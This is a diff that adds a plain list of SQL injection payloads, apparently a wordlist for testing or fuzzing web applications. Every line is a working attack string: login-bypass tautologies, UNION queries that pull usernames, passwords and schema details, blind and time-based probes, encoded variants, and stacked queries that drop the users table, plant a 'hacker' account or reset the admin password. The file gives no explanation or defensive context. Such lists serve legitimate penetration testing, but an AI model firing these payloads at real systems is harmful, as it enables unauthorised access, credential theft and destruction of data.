@@ -1,0 +1,29 @@
+' OR '1'='1
+" OR "1"="1
+' OR 'a'='a
+' OR 1=1--
+" OR 1=1--
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /* 
+' UNION SELECT NULL, NULL --  
+' UNION SELECT 1,2,3 --  
+' UNION SELECT username, password FROM users --  
+' UNION SELECT table_name, column_name FROM information_schema.columns --  
+' AND 1=CONVERT(int, (SELECT @@version)) --  
+' AND 1=CAST((SELECT version()) AS INT) --  
+' AND (SELECT COUNT(*) FROM users) > 0 --  
+' AND 1=1 --  
+' AND 1=2 --  
+" AND 1=1 --  
+" AND 1=2 --  
+' AND (SELECT 'a' FROM users WHERE username='admin' AND LENGTH(password)>5)='a' --  
+' OR IF(1=1, SLEEP(5), 0) --  
+' OR IF(1=2, SLEEP(5), 0) --  
+' AND (SELECT IF(username='admin', SLEEP(5), 0) FROM users) --  
+' WAITFOR DELAY '0:0:5' --  
+'; DROP TABLE users; --  
+'; INSERT INTO users (username, password) VALUES ('hacker', 'hacked'); --  
+'; UPDATE users SET password='hacked' WHERE username='admin'; --  
+0x27 OR 0x31=0x31 --  
+%27 OR %31=%31 --  
